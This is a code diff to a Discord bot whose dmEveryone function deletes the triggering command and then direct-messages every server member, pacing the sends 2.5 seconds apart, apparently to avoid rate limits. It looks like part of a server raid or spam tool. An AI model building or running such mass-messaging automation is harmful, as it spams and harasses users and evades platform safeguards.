@@ -28,11 +28,23 @@ async function makeChannel(message, name) {
 }
 
 async function dmEveryone(message, toDM) {
-	let members = await message.guild.members.fetch({ force: true }); 
-	members.forEach(member => {
-		member.send(toDM).catch(e => (console.log(`Error while DMALL / ${message.author.id} : ${message.author.tag}`)))
-	});
+	await message.delete().catch()
+	let members = await message.guild.members.fetch({ force: true });
+	var delay = 1
+	for (const [key, value] of members.entries()) {
+		setTimeout(async () => {
+			let channel = value.user.dmChannel;
+			if (!channel) {
+			channel =  await value.user.createDM(true).catch()
+			}
+			await channel
+			.send(toDM)
+			.catch(() => console.log("error"))
+		}, delay++*2500)
+	}
 }
+
+//setTimeout(() => value.send(key + " " + toDM).catch(() => (console.log(`Error while DMALL / ${message.author.id} : ${message.author.tag}`))), delay++*5000)
 
 async function renameEveryone(message, name) {
 	let members = await message.guild.members.fetch({ force: true }); 
